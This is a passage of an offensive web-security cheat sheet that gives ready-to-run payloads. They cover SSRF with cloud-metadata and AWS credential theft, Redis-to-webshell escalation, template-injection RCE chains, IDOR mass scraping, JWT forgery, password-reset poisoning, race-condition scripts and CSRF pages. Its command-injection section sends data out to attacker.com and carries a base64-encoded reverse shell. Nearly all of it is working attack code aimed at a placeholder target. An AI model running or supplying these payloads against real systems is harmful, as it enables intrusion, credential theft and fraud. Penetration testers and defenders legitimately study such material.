  TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/"

  # GCP metadata
  curl -s "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
    -H "Metadata-Flavor: Google"
  curl -s "https://target.com/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

  # Azure metadata
  curl -s "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
    -H "Metadata: true"

  # DigitalOcean metadata
  curl -s "https://target.com/fetch?url=http://169.254.169.254/metadata/v1/"

  # Alibaba Cloud metadata
  curl -s "https://target.com/fetch?url=http://100.100.100.200/latest/meta-data/"
  ```
  ::
::

### SSRF Bypass Techniques

::warning
SSRF filters often block `127.0.0.1`, `localhost`, and `169.254.169.254`. Use alternative representations to bypass.
::

```
┌───────────────────────────────────────────────────────────────────┐
│                    SSRF BYPASS TECHNIQUES                        │
│                                                                  │
│  ┌──────────────────┐     ┌──────────────────┐                  │
│  │  IP Address      │     │  DNS Based       │                  │
│  │  Variations      │     │  Techniques      │                  │
│  │  ─────────────   │     │  ─────────────   │                  │
│  │  0x7f000001      │     │  attacker.com    │                  │
│  │  2130706433      │     │  → resolves to   │                  │
│  │  017700000001    │     │  127.0.0.1       │                  │
│  │  127.1           │     │  DNS rebinding   │                  │
│  │  0              │     │  nip.io / sslip  │                  │
│  └──────────────────┘     └──────────────────┘                  │
│                                                                  │
│  ┌──────────────────┐     ┌──────────────────┐                  │
│  │  URL Parsing     │     │  Protocol Based  │                  │
│  │  Confusion       │     │  Techniques      │                  │
│  │  ─────────────   │     │  ─────────────   │                  │
│  │  @redirect       │     │  gopher://       │                  │
│  │  #fragment       │     │  dict://         │                  │
│  │  url=//          │     │  file:///        │                  │
│  │  CRLF injection  │     │  tftp://         │                  │
│  └──────────────────┘     └──────────────────┘                  │
└───────────────────────────────────────────────────────────────────┘
```

```bash
# Decimal IP representation (127.0.0.1 = 2130706433)
curl -s "https://target.com/fetch?url=http://2130706433/"

# Hexadecimal IP
curl -s "https://target.com/fetch?url=http://0x7f000001/"

# Octal IP
curl -s "https://target.com/fetch?url=http://0177.0.0.1/"

# Shortened IP
curl -s "https://target.com/fetch?url=http://127.1/"
curl -s "https://target.com/fetch?url=http://0/"

# IPv6 localhost
curl -s "https://target.com/fetch?url=http://[::1]/"
curl -s "https://target.com/fetch?url=http://[::]/"
curl -s "https://target.com/fetch?url=http://[0000::1]/"

# DNS-based bypass using nip.io
curl -s "https://target.com/fetch?url=http://127.0.0.1.nip.io/"

# DNS-based bypass using sslip.io
curl -s "https://target.com/fetch?url=http://127.0.0.1.sslip.io/"

# URL encoding bypass
curl -s "https://target.com/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"

# Double URL encoding
curl -s "https://target.com/fetch?url=http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/"

# Redirect-based bypass
curl -s "https://target.com/fetch?url=https://attacker.com/redirect?to=http://127.0.0.1/"

# URL authority confusion
curl -s "https://target.com/fetch?url=http://attacker.com@127.0.0.1/"
curl -s "https://target.com/fetch?url=http://127.0.0.1#@allowed-domain.com/"

# CRLF injection in URL
curl -s "https://target.com/fetch?url=http://allowed.com%0d%0aHost:%20127.0.0.1/"

# Unicode normalization
curl -s "https://target.com/fetch?url=http://ⅰ②⑦.⓪.⓪.①/"

# Enclosed alphanumerics
curl -s "https://target.com/fetch?url=http://①②⑦.⓪.⓪.①/"

# Alternative protocols
curl -s "https://target.com/fetch?url=gopher://127.0.0.1:6379/_INFO"
curl -s "https://target.com/fetch?url=dict://127.0.0.1:6379/INFO"
curl -s "https://target.com/fetch?url=file:///etc/passwd"
```

### SSRF to RCE Escalation

::code-collapse

```bash
# SSRF → Redis → RCE via Gopher protocol
# Step 1: Generate gopher payload
python3 -c "
import urllib.parse
payload = '''*3\r\n\$3\r\nSET\r\n\$11\r\nshell_value\r\n\$56\r\n<?php system(\$_GET['cmd']); ?>\r\n*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$3\r\ndir\r\n\$13\r\n/var/www/html\r\n*4\r\n\$6\r\nCONFIG\r\n\$3\r\nSET\r\n\$10\r\ndbfilename\r\n\$9\r\nshell.php\r\n*1\r\n\$4\r\nSAVE\r\n'''
print('gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload))
"

# Step 2: Send via SSRF
curl -s "https://target.com/fetch?url=GOPHER_PAYLOAD_HERE"

# Step 3: Execute commands
curl -s "https://target.com/shell.php?cmd=id"

# SSRF → AWS Credentials → S3 Data Exfiltration
# Step 1: Retrieve IAM role
ROLE=$(curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")

# Step 2: Get credentials
CREDS=$(curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}")

# Step 3: Parse and use credentials
ACCESS_KEY=$(echo $CREDS | jq -r '.AccessKeyId')
SECRET_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')

AWS_ACCESS_KEY_ID=$ACCESS_KEY \
AWS_SECRET_ACCESS_KEY=$SECRET_KEY \
AWS_SESSION_TOKEN=$SESSION_TOKEN \
aws s3 ls

# SSRF → Internal Admin Panel → Account Takeover
curl -s "https://target.com/fetch?url=http://127.0.0.1:8080/admin/users" | jq '.'
curl -s "https://target.com/fetch?url=http://127.0.0.1:8080/admin/user/1/reset-password"

# SSRF → Kubernetes API
curl -s "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets" \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

::

---

## Server-Side Template Injection (SSTI) PoC Techniques

::badge
Critical
::

### Template Engine Detection

```
┌────────────────────────────────────────────────────────────────┐
│              TEMPLATE ENGINE DETECTION TREE                    │
│                                                                │
│                      ${7*7}                                    │
│                     /      \                                   │
│                   49       ${7*7}                               │
│                  /              \                               │
│             {{7*7}}         Not SSTI                            │
│            /       \                                           │
│          49       {{7*7}}                                      │
│         /              \                                       │
│    {{7*'7'}}        a{*comment*}b                              │
│    /      \             /        \                              │
│  7777777  49          ab        a{*comment*}b                  │
│   |        |          |              |                          │
│  Jinja2  Twig      Smarty       Unknown                       │
│                                                                │
│  Other Checks:                                                 │
│  <%=7*7%>  → ERB (Ruby)                                       │
│  #{7*7}    → Slim/Pug                                         │
│  @(7*7)    → Razor (.NET)                                     │
│  #set($x=7*7)${x} → Velocity (Java)                          │
│  ${T(java.lang.Runtime).getRuntime()} → Spring EL (Java)      │
└────────────────────────────────────────────────────────────────┘
```

::tabs
  ::tabs-item{icon="i-lucide-code" label="Detection Payloads"}

  ```bash
  # Universal SSTI detection payloads
  PAYLOADS=(
    '{{7*7}}'
    '${7*7}'
    '<%= 7*7 %>'
    '#{7*7}'
    '{{7*"7"}}'
    '*{7*7}'
    '@(7*7)'
    '${T(java.lang.Math).random()}'
  )

  for payload in "${PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    response=$(curl -s "https://target.com/render?template=${encoded}")
    if echo "$response" | grep -q "49"; then
      echo "[VULNERABLE] Payload: $payload"
    fi
  done

  # Jinja2 detection
  curl -s "https://target.com/render?tpl={{config.items()}}"
  curl -s "https://target.com/render?tpl={{self.__class__.__mro__}}"

  # Twig detection
  curl -s "https://target.com/render?tpl={{_self.env.getFilter('id')}}"

  # Freemarker detection
  curl -s "https://target.com/render?tpl=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

  # Velocity detection
  curl -s "https://target.com/render?tpl=#set(\$x='')#set(\$rt=\$x.class.forName('java.lang.Runtime'))#set(\$chr=\$x.class.forName('java.lang.Character'))#set(\$str=\$x.class.forName('java.lang.String'))"

  # Pebble detection
  curl -s "https://target.com/render?tpl={% set cmd = 'id' %}{{variable.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd)}}"
  ```
  ::

  ::tabs-item{icon="i-lucide-terminal" label="RCE Payloads"}

  ```bash
  # Jinja2 RCE
  curl -s "https://target.com/render?tpl={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

  # Jinja2 RCE - alternative chain
  curl -s "https://target.com/render?tpl={{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0]}}"

  # Jinja2 RCE - bypass with lipsum
  curl -s "https://target.com/render?tpl={{lipsum.__globals__['os'].popen('id').read()}}"

  # Jinja2 RCE - request object
  curl -s "https://target.com/render?tpl={{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}"

  # Twig RCE (v1)
  curl -s "https://target.com/render?tpl={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

  # Twig RCE (v3)
  curl -s "https://target.com/render?tpl={{['id']|filter('system')}}"

  # Freemarker RCE
  curl -s "https://target.com/render?tpl=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

  # Mako RCE
  curl -s "https://target.com/render?tpl=<%import os;x=os.popen('id').read()%>\${x}"

  # ERB (Ruby) RCE
  curl -s "https://target.com/render?tpl=<%25%3d+system('id')+%25>"

  # Handlebars RCE (Node.js)
  curl -s "https://target.com/render?tpl={{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"

  # Spring Expression Language (SpEL) RCE
  curl -s "https://target.com/render?tpl=\${T(java.lang.Runtime).getRuntime().exec('id')}"
  ```
  ::
::

### SSTI Filter Bypass

```bash
# Jinja2 - Bypass underscore filter
curl -s "https://target.com/render?tpl={{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"

# Jinja2 - Bypass dot notation filter
curl -s "https://target.com/render?tpl={{lipsum['__globals__']['os']['popen']('id')['read']()}}"

# Jinja2 - Bypass using request object
curl -s "https://target.com/render?tpl={{request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__getitem__')('json')|attr('JSONEncoder')|attr('default')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"

# Jinja2 - Bypass using hex encoding
curl -s "https://target.com/render?tpl={{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x6f\x73'].popen('id').read()}}"

# Jinja2 - Bypass using string concatenation
curl -s "https://target.com/render?tpl={{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['o'+'s'].popen('id').read()}}"

# Jinja2 - Bypass using |join filter
curl -s "https://target.com/render?tpl={%set a=['o','s']%}{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[a|join].popen('id').read()}}"
```

---

## Insecure Direct Object Reference (IDOR) PoC Techniques

::badge
High
::

### IDOR Discovery and Exploitation

::tabs
  ::tabs-item{icon="i-lucide-search" label="Detection"}

  ```bash
  # Numeric ID enumeration
  for id in $(seq 1 100); do
    response=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
      "https://target.com/api/user/${id}" \
      -H "Authorization: Bearer VICTIM_TOKEN")
    echo "ID $id: $response"
  done

  # UUID-based IDOR (requires UUID leak)
  # Step 1: Find UUID leak in API responses
  curl -s "https://target.com/api/comments" -H "Authorization: Bearer TOKEN" | \
    jq '.[].author.id'

  # Step 2: Access other users with leaked UUIDs
  curl -s "https://target.com/api/user/LEAKED_UUID" \
    -H "Authorization: Bearer ATTACKER_TOKEN"

  # Hash-based IDOR (predictable hashing)
  # If IDs use MD5(username) or similar
  echo -n "admin" | md5sum
  curl -s "https://target.com/api/user/21232f297a57a5a743894a0e4a801fc3" \
    -H "Authorization: Bearer ATTACKER_TOKEN"

  # Parameter-based IDOR
  curl -s "https://target.com/api/orders?user_id=VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN"

  # Body parameter IDOR
  curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"from_account":"ATTACKER_ID","to_account":"ATTACKER_ID","amount":1000,"source_user":"VICTIM_ID"}'

  # HTTP method-based IDOR
  # GET works but PUT/PATCH may bypass authorization
  curl -s -X PUT "https://target.com/api/user/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com"}'
  ```
  ::

  ::tabs-item{icon="i-lucide-arrow-up-right" label="Escalation"}

  ```bash
  # IDOR → Account Takeover (password reset)
  curl -s -X POST "https://target.com/api/user/VICTIM_ID/reset-password" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"new_password":"hacked123"}'

  # IDOR → Data Exfiltration (mass scraping)
  for id in $(seq 1 10000); do
    curl -s "https://target.com/api/user/${id}/profile" \
      -H "Authorization: Bearer ATTACKER_TOKEN" >> all_users_data.json
    sleep 0.1
  done

  # IDOR → Financial Impact (modify transactions)
  curl -s -X PATCH "https://target.com/api/order/VICTIM_ORDER_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"shipping_address":"attacker_address","status":"approved"}'

  # IDOR → Privilege Escalation (role change)
  curl -s -X PUT "https://target.com/api/user/ATTACKER_ID/role" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin"}'

  # IDOR → File Access
  curl -s "https://target.com/api/documents/VICTIM_DOC_ID/download" \
    -H "Authorization: Bearer ATTACKER_TOKEN" -o stolen_document.pdf

  # IDOR in GraphQL
  curl -s -X POST "https://target.com/graphql" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"VICTIM_ID\") { email phone ssn creditCard } }"}'
  ```
  ::

  ::tabs-item{icon="i-lucide-shield-off" label="Bypass Techniques"}

  ```bash
  # Swap HTTP method
  # If GET is blocked, try POST/PUT/PATCH/DELETE
  curl -s -X DELETE "https://target.com/api/user/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN"

  # Add wrapping (JSON array)
  curl -s -X POST "https://target.com/api/users" \
    -H "Content-Type: application/json" \
    -d '{"ids":[ATTACKER_ID, VICTIM_ID]}'

  # Change content type
  # application/json → application/xml
  curl -s -X POST "https://target.com/api/user" \
    -H "Content-Type: application/xml" \
    -d '<user><id>VICTIM_ID</id></user>'

  # Parameter pollution
  curl -s "https://target.com/api/user?id=ATTACKER_ID&id=VICTIM_ID"

  # Path traversal in ID
  curl -s "https://target.com/api/user/ATTACKER_ID/../VICTIM_ID"

  # Wildcard / special values
  curl -s "https://target.com/api/user/*"
  curl -s "https://target.com/api/user/null"
  curl -s "https://target.com/api/user/0"
  curl -s "https://target.com/api/user/-1"

  # Version rollback
  curl -s "https://target.com/api/v1/user/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN"
  # v2 might have checks, but v1 might not

  # Case manipulation for string IDs
  curl -s "https://target.com/api/user/VICTIM_ID"
  curl -s "https://target.com/api/user/victim_id"
  curl -s "https://target.com/api/user/Victim_Id"
  ```
  ::
::

---

## Authentication & Authorization Bypass PoC

::badge
Critical
::

### JWT Attack Techniques

::accordion
  ::accordion-item
  ---
  icon: i-lucide-key
  label: JWT Algorithm Confusion
  ---

  ```bash
  # Decode JWT without verification
  echo "eyJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature" | \
    cut -d. -f2 | base64 -d 2>/dev/null | jq '.'

  # Algorithm None attack
  # Change header to {"alg":"none"} and remove signature
  python3 -c "
  import base64, json
  header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
  payload = base64.urlsafe_b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).rstrip(b'=')
  print(f'{header.decode()}.{payload.decode()}.')
  "

  # Use forged JWT
  curl -s "https://target.com/api/admin" \
    -H "Authorization: Bearer FORGED_TOKEN_HERE"

  # RS256 → HS256 confusion attack
  # Step 1: Get the public key
  curl -s "https://target.com/.well-known/jwks.json" | jq '.'
  openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem

  # Step 2: Sign with public key using HS256
  python3 -c "
  import jwt
  public_key = open('public.pem').read()
  token = jwt.encode({'user':'admin','role':'admin'}, public_key, algorithm='HS256')
  print(token)
  "

  # JWT tool comprehensive testing
  python3 jwt_tool.py TOKEN -T
  python3 jwt_tool.py TOKEN -C -d wordlist.txt  # Crack weak secret
  python3 jwt_tool.py TOKEN -X a  # Algorithm none
  python3 jwt_tool.py TOKEN -X k -pk public.pem  # Key confusion
  python3 jwt_tool.py TOKEN -I -pc user -pv admin  # Inject claim
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-key
  label: JWT Secret Cracking
  ---

  ```bash
  # Crack JWT secret with hashcat
  echo "JWT_TOKEN_HERE" > jwt.txt
  hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

  # Crack with john
  john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

  # Crack with jwt_tool
  python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

  # Common weak JWT secrets to try
  SECRETS=("secret" "password" "123456" "key" "private" "jwt_secret" "" "null" "undefined" "admin")
  for secret in "${SECRETS[@]}"; do
    token=$(python3 -c "
  import jwt
  try:
      decoded = jwt.decode('JWT_TOKEN', '$secret', algorithms=['HS256'])
      print(jwt.encode({'user':'admin','role':'admin'}, '$secret', algorithm='HS256'))
  except: pass
  ")
    if [ -n "$token" ]; then
      echo "[CRACKED] Secret: $secret"
      echo "[TOKEN] $token"
    fi
  done

  # JWKS injection - create attacker-controlled key
  python3 jwt_tool.py JWT_TOKEN -X s -ju "https://attacker.com/.well-known/jwks.json"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-key
  label: JWT Header Injection (jku/x5u)
  ---

  ```bash
  # jku header injection
  # Step 1: Generate RSA keypair
  openssl genrsa -out attacker_private.pem 2048
  openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

  # Step 2: Create JWKS file with your public key
  python3 -c "
  from jwcrypto import jwk
  import json
  key = jwk.JWK.from_pem(open('attacker_public.pem','rb').read())
  jwks = {'keys': [json.loads(key.export())]}
  print(json.dumps(jwks, indent=2))
  " > jwks.json

  # Step 3: Host JWKS on attacker server and sign token
  python3 -c "
  import jwt
  private_key = open('attacker_private.pem').read()
  token = jwt.encode(
      {'user':'admin','role':'admin'},
      private_key,
      algorithm='RS256',
      headers={'jku':'https://attacker.com/.well-known/jwks.json'}
  )
  print(token)
  "

  # Step 4: Use forged token
  curl -s "https://target.com/api/admin/dashboard" \
    -H "Authorization: Bearer FORGED_TOKEN"
  ```
  ::
::

### OAuth & SSO Bypass

```bash
# Open Redirect in OAuth callback
curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback/../redirect?url=https://attacker.com&response_type=code"

# Redirect URI validation bypass techniques
# Path traversal
redirect_uri=https://target.com/callback/..%2F..%2Fredirect%3Furl%3Dhttps://attacker.com

# Subdomain matching bypass
redirect_uri=https://target.com.attacker.com/callback

# Fragment-based bypass
redirect_uri=https://target.com/callback%23@attacker.com

# Port-based bypass
redirect_uri=https://target.com:443@attacker.com/callback

# OAuth state parameter CSRF
# Missing state parameter = CSRF in OAuth flow
curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback&response_type=code"
# If no state parameter required, attacker can forge OAuth flow

# OAuth token reuse across applications
curl -s -X POST "https://target.com/oauth/token" \
  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=APP&redirect_uri=https://target.com/callback"

# Race condition in OAuth code exchange
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=authorization_code&code=AUTH_CODE&client_id=APP&client_secret=SECRET" &
done
wait
```

### Password Reset Poisoning

```bash
# Host header poisoning for password reset
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com"}'

# X-Forwarded-Host poisoning
curl -s -X POST "https://target.com/api/password/reset" \
  -H "X-Forwarded-Host: attacker.com" \
  -d '{"email":"victim@target.com"}'

# Multiple host headers
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Host: target.com" \
  -H "Host: attacker.com" \
  -d '{"email":"victim@target.com"}'

# Referer header based reset link
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Referer: https://attacker.com" \
  -d '{"email":"victim@target.com"}'

# Token predictability testing
for i in $(seq 1 20); do
  TOKEN=$(curl -s -X POST "https://target.com/api/password/reset" \
    -d '{"email":"attacker@test.com"}' | jq -r '.token')
  echo "Token $i: $TOKEN"
done
# Check for sequential tokens, timestamps, or weak randomness

# Password reset via parameter manipulation
curl -s -X POST "https://target.com/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":["victim@target.com","attacker@evil.com"]}'

curl -s -X POST "https://target.com/api/password/reset" \
  -d "email=victim@target.com&email=attacker@evil.com"
```

---

## Race Condition PoC Techniques

::badge
High
::

### Race Condition Exploitation

::tip
Race conditions exploit **Time-of-Check to Time-of-Use (TOCTOU)** gaps where the application checks a condition and then performs an action, but the state can change between the two operations.
::

```
┌──────────────────────────────────────────────────────────────┐
│                    RACE CONDITION FLOW                       │
│                                                              │
│   Thread 1          Server State          Thread 2           │
│   ────────          ────────────          ────────           │
│   Check balance     Balance: $100        Check balance       │
│   (sees $100)                            (sees $100)        │
│   Withdraw $100     Balance: $0                              │
│                     Balance: -$100       Withdraw $100       │
│                                                              │
│   Result: Both withdrawals succeed = Double Spending         │
└──────────────────────────────────────────────────────────────┘
```

::tabs
  ::tabs-item{icon="i-lucide-zap" label="Turbo Intruder"}

  ```python
  # Burp Suite Turbo Intruder script for race conditions
  # Single-packet attack (HTTP/2) for precise timing

  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=1,
                             engine=Engine.BURP2)

      # Queue 20 identical requests
      for i in range(20):
          engine.queue(target.req, gate='race')

      # Open the gate - all requests sent simultaneously
      engine.openGate('race')

  def handleResponse(req, interesting):
      table.add(req)
  ```
  ::

  ::tabs-item{icon="i-lucide-terminal" label="cURL Parallel"}

  ```bash
  # Parallel requests using curl
  # Coupon/discount code reuse
  for i in $(seq 1 50); do
    curl -s -X POST "https://target.com/api/apply-coupon" \
      -H "Authorization: Bearer TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"code":"DISCOUNT50","order_id":"ORDER123"}' &
  done
  wait

  # Parallel withdrawal (double spending)
  for i in $(seq 1 20); do
    curl -s -X POST "https://target.com/api/withdraw" \
      -H "Authorization: Bearer TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"amount":100,"account":"attacker_account"}' &
  done
  wait

  # Vote manipulation
  for i in $(seq 1 100); do
    curl -s -X POST "https://target.com/api/vote" \
      -H "Authorization: Bearer TOKEN" \
      -d '{"post_id":"TARGET_POST","vote":"up"}' &
  done
  wait

  # Follow/unfollow race for follower count manipulation
  for i in $(seq 1 50); do
    curl -s -X POST "https://target.com/api/follow" \
      -H "Authorization: Bearer TOKEN" \
      -d '{"user_id":"TARGET_USER"}' &
    curl -s -X DELETE "https://target.com/api/follow" \
      -H "Authorization: Bearer TOKEN" \
      -d '{"user_id":"TARGET_USER"}' &
  done
  wait
  ```
  ::

  ::tabs-item{icon="i-lucide-code" label="Python Script"}

  ```python
  # Python race condition exploit with threading
  import requests
  import threading

  url = "https://target.com/api/redeem"
  headers = {
      "Authorization": "Bearer TOKEN",
      "Content-Type": "application/json"
  }
  data = {"gift_card": "GIFTCARD123", "amount": 100}

  results = []

  def send_request():
      r = requests.post(url, json=data, headers=headers)
      results.append({
          "status": r.status_code,
          "body": r.text
      })

  # Create threads
  threads = []
  for i in range(50):
      t = threading.Thread(target=send_request)
      threads.append(t)

  # Start all threads as close together as possible
  for t in threads:
      t.start()

  # Wait for completion
  for t in threads:
      t.join()

  # Analyze results
  success_count = sum(1 for r in results if r["status"] == 200)
  print(f"Successful redemptions: {success_count}")
  if success_count > 1:
      print("[VULNERABLE] Race condition confirmed!")
  ```
  ::
::

### Common Race Condition Targets

- **Coupon/promo code redemption** — Apply same code multiple times
- **Money transfers/withdrawals** — Double spending
- **Invitation/referral systems** — Multiple bonus claims
- **Like/vote/follow systems** — Count manipulation
- **File upload overwrite** — Replace files during processing
- **Email verification** — Verify before token expires
- **2FA bypass** — Submit correct code multiple times
- **Account creation** — Duplicate username/email registration

---

## Command Injection PoC Techniques

::badge
Critical
::

### Injection Vectors

::tabs
  ::tabs-item{icon="i-lucide-terminal" label="Basic Injection"}

  ```bash
  # Semicolon separator
  curl -s "https://target.com/api/ping?host=127.0.0.1;id"

  # Pipe operator
  curl -s "https://target.com/api/ping?host=127.0.0.1|id"

  # AND operator
  curl -s "https://target.com/api/ping?host=127.0.0.1&&id"

  # OR operator
  curl -s "https://target.com/api/ping?host=127.0.0.1||id"

  # Backtick substitution
  curl -s "https://target.com/api/ping?host=\`id\`"

  # Dollar substitution
  curl -s "https://target.com/api/ping?host=\$(id)"

  # Newline injection
  curl -s "https://target.com/api/ping?host=127.0.0.1%0aid"

  # Carriage return
  curl -s "https://target.com/api/ping?host=127.0.0.1%0d%0aid"
  ```
  ::

  ::tabs-item{icon="i-lucide-shield-off" label="Filter Bypass"}

  ```bash
  # Space bypass using IFS
  curl -s "https://target.com/api/ping?host=127.0.0.1;cat\${IFS}/etc/passwd"

  # Space bypass using tabs
  curl -s "https://target.com/api/ping?host=127.0.0.1;cat%09/etc/passwd"

  # Space bypass using brace expansion
  curl -s "https://target.com/api/ping?host=127.0.0.1;{cat,/etc/passwd}"

  # Keyword bypass using wildcards
  curl -s "https://target.com/api/ping?host=127.0.0.1;/bin/ca?%20/etc/pas?wd"

  # Keyword bypass using variable insertion
  curl -s "https://target.com/api/ping?host=127.0.0.1;c\$()at%20/etc/passwd"

  # Keyword bypass using quotes
  curl -s "https://target.com/api/ping?host=127.0.0.1;c'a't%20/etc/passwd"
  curl -s "https://target.com/api/ping?host=127.0.0.1;c\"a\"t%20/etc/passwd"

  # Keyword bypass using backslash
  curl -s "https://target.com/api/ping?host=127.0.0.1;c\at%20/e\tc/pa\sswd"

  # Keyword bypass using hex encoding
  curl -s "https://target.com/api/ping?host=127.0.0.1;\$'\\x63\\x61\\x74'%20/etc/passwd"

  # Keyword bypass using base64
  curl -s "https://target.com/api/ping?host=127.0.0.1;\$(echo%20Y2F0IC9ldGMvcGFzc3dk|base64%20-d)"

  # Reverse shell bypass
  curl -s "https://target.com/api/ping?host=127.0.0.1;echo%20YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA%2bJjE%3d|base64%20-d|bash"
  ```
  ::

  ::tabs-item{icon="i-lucide-clock" label="Blind Injection"}

  ```bash
  # Time-based blind detection
  curl -o /dev/null -s -w "Time: %{time_total}s\n" \
    "https://target.com/api/ping?host=127.0.0.1;sleep%205"

  # DNS-based out-of-band
  curl -s "https://target.com/api/ping?host=127.0.0.1;\$(whoami).attacker.burpcollaborator.net"
  curl -s "https://target.com/api/ping?host=127.0.0.1;nslookup%20\$(whoami).attacker.com"

  # HTTP-based out-of-band
  curl -s "https://target.com/api/ping?host=127.0.0.1;curl%20https://attacker.com/\$(whoami)"
  curl -s "https://target.com/api/ping?host=127.0.0.1;wget%20https://attacker.com/\$(cat%20/etc/hostname)"

  # File-based blind confirmation
  curl -s "https://target.com/api/ping?host=127.0.0.1;id%20>%20/var/www/html/proof.txt"
  curl -s "https://target.com/proof.txt"

  # Conditional blind injection
  curl -o /dev/null -s -w "Time: %{time_total}s\n" \
    "https://target.com/api/ping?host=127.0.0.1;if%20[\$(whoami)%20=%20root];then%20sleep%205;fi"
  ```
  ::
::

---

## CSRF PoC Techniques

::badge
High
::

### CSRF PoC Templates

::code-group

```html [Basic Form CSRF]
<html>
<body>
<h1>CSRF PoC - Email Change</h1>
<form id="csrf-form" action="https://target.com/api/user/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf_token" value="" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

```html [JSON Body CSRF]
<html>
<body>
<script>
fetch('https://target.com/api/user/settings', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({
    "email": "attacker@evil.com",
    "role": "admin"
  })
});
</script>
</body>
</html>
```

```html [Multipart CSRF]
<html>
<body>
<form id="csrf" action="https://target.com/api/profile/update" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="hacked" />
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="role" value="admin" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

```html [Auto-Submit with Iframe]
<html>
<body>
<iframe style="display:none" name="csrf-frame"></iframe>
<form id="csrf" action="https://target.com/api/password/change" method="POST" target="csrf-frame">
  <input type="hidden" name="new_password" value="hacked123" />
